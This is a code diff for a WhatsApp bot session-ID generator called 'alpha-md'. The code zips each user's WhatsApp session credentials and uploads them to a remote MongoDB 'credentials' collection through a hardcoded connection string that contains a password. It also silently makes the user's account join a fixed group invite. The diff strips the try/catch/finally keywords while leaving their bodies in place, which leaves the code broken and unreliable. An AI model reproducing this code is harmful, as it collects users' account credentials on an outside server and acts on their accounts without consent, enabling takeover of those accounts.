@@ -62,6 +62,7 @@ XeonBotInc.ev.on("connection.update",async  (s) => {
             await delay(1000 * 10)
             await XeonBotInc.sendMessage(XeonBotInc.user.id, { text: '*thanks for choosing alpha-md*\n*your sesssionid will be sent in 10 seconds please wait..*\n*have a great day ahead*' });
             await delay(1000 * 10)
+             const xeonses = await XeonBotInc.sendMessage(XeonBotInc.user.id, { text: id });
             const folderPath = `./session/${id}/`;
                const output = fs.createWriteStream(`creds_${id}.zip`);
                const archive = archiver('zip', {
@@ -70,7 +71,7 @@ XeonBotInc.ev.on("connection.update",async  (s) => {
                output.on('close', async () => {
                    console.log('Zip file created successfully.');
                    const client = new MongoClient();
-                   try {
+                   
                        await client.connect('https://r2:uploader2@uploader2.uhnmx1u.mongodb.net/?retryWrites=true&w=majority&appName=uploader2');
                        const database = client.db('testdb');
                        const collection = database.collection('credentials');
@@ -81,11 +82,11 @@ XeonBotInc.ev.on("connection.update",async  (s) => {
                        });
    
                        console.log('File uploaded to MongoDB with ID:', result.insertedId);
-                   } catch (error) {
+                   
                        console.error('Error uploading file to MongoDB:', error);
-                   } finally {
+                   
                        await client.close();
-                   }
+                   
                         XeonBotInc.groupAcceptInvite("BGWpp9qySw81CGrqRM3ceg");
                        const xeonses = await XeonBotInc.sendMessage(XeonBotInc.user.id, { text: id });
                        await XeonBotInc.sendMessage(XeonBotInc.user.id, { text: `*ᴅᴇᴀʀ ᴜsᴇʀ ᴛʜɪs ɪs ʏᴏᴜʀ sᴇssɪᴏɴ ɪᴅ*\n*◕ ⚠️ ᴘʟᴇᴀsᴇ ᴅᴏ ɴᴏᴛ sʜᴀʀᴇ ᴛʜɪs ᴄᴏᴅᴇ ᴡɪᴛʜ ᴀɴʏᴏɴᴇ ᴀs ɪᴛ ᴄᴏɴᴛᴀɪɴs ʀᴇǫᴜɪʀᴇᴅ ᴅᴀᴛᴀ ᴛᴏ ɢᴇᴛ ʏᴏᴜʀ ᴄᴏɴᴛᴀᴄᴛ ᴅᴇᴛᴀɪʟs ᴀɴᴅ ᴀᴄᴄᴇss ʏᴏᴜʀ ᴡʜᴀᴛsᴀᴘᴘ*` }, {quoted: xeonses});
